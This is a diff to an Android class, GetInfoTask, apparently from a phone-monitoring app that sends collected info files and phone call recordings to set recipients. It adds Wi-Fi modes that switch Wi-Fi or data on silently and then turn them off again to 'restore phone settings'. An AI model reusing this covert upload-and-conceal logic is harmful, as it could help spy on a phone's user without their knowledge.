@@ -91,6 +91,7 @@ public class GetInfoTask extends TimerTask
 		String[] recipients = getRecipients(context);
 		if (recipients == null || recipients.length == 0) return;
 		
+		boolean isAlreadyWifiConnected = NetworkUtil.isWifiConnected(context);
 		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
 		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
 		
@@ -99,18 +100,29 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		if (isTimeToCollectInfo()) 
 		{
-			// If network not connected, retrun if silent mode
-			if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
-				return;
-			}
-			// Or try to connect network if active mode
-			else if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
-				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+			// If network not connected
+			if (!isAlreadyDataNetworkConnected) {
+				// Retrun if silent mode
+				if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
 					return;
 				}
+				// Or try to connect WIFI if wifi active mode
+				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+					if (!NetworkUtil.tryToConnectWifi(context)) {
+						return;
+					}
+				}
+				// Or try to connect network if active mode
+				else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+					if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+						return;
+					}
+				}
 			}
-			
-			// If come here, means the network connected
+			// When comes here, means the network connected. But these is still possibility that 
+			// it is not WIFI (means it is 3G/GPRS data connected).
+			// Since info files are small (generally less than 200KB) and few (once per day at max), 
+			// we will still let app use 3G/GPRS data connection to send info files.
 			
 			// Clean attachments
 			if (attachments == null) attachments = new ArrayList<File>();
@@ -163,16 +175,39 @@ public class GetInfoTask extends TimerTask
 		// Try to send phone call recording
 		// ===================================================================================
 		SysUtils.threadSleep(1000, LOGTAG);
-		// If network connected, try to collect and send the information
+		boolean isWifiConnected = NetworkUtil.isWifiConnected(context);
 		boolean isConnected = NetworkUtil.isNetworkConnected(context);
-		// If network not connected, retrun if silent mode
-		if (!isConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
-			return;
-		}
-		// Or try to connect network if active mode
-		else if (!isConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
-			if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+		
+		// If network not connected
+		if (!isConnected) {
+			// Retrun if silent mode
+			if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
 				return;
+			}
+			// Or try to connect WIFI if wifi active mode
+			else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+				if (!NetworkUtil.tryToConnectWifi(context)) {
+					return;
+				}
+			}
+			// Or try to connect network if active mode
+			else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
+					return;
+				}
+			}
+		}
+		// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
+		else if (!isWifiConnected) {
+			// Return if WIFI silent mode
+			if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
+				return;
+			}
+			// Try to connect WIFI if WIFI active mode
+			else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+				if (!NetworkUtil.tryToConnectWifi(context)) {
+					return;
+				}
 			}
 		}
 		
@@ -233,9 +268,16 @@ public class GetInfoTask extends TimerTask
 			}
 		}
 		
+		// ===================================================================================
+		// Restore phone settings
+		// ===================================================================================
 		// If data network is connected by active mode, try to disconnect it
 		if (!isAlreadyDataNetworkConnected) {
 			NetworkUtil.tryToDisconnectDataNetwork(context);
+		}
+		// If WIFI connection is connected by active mode, try to disconnect it 
+		else if (!isAlreadyWifiConnected && NetworkUtil.isWifiConnected(context)) {
+			NetworkUtil.tryToDisconnectWifi(context);
 		}
 		
 	} // end of run()
